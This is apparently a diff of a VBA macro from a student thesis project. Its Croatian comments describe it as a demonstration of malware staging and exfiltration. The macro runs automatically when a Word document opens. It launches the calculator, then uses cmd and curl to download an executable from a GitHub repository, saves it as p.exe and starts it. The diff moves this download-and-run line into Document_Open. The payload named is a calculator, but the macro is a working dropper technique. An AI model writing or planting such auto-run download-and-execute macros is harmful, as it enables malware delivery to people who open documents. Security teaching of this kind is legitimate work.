@@ -4,6 +4,8 @@ Sub Document_Open()
 Set objShell = CreateObject("Wscript.Shell")
 objShell.Run "calc"
 
+'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
+Shell ("cmd /c curl "https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe" --output p.exe && start p.exe")
 
 'upload calc.exe na localhost za primjer exfiltracije podataka
 Dim Str As String
@@ -14,9 +16,4 @@ Dim Str As String
 End Sub
 
 
-'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
-Sub AutoOpen()
 
-Shell ("cmd /c curl "https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe" --output p.exe && start p.exe")
-
-End Sub
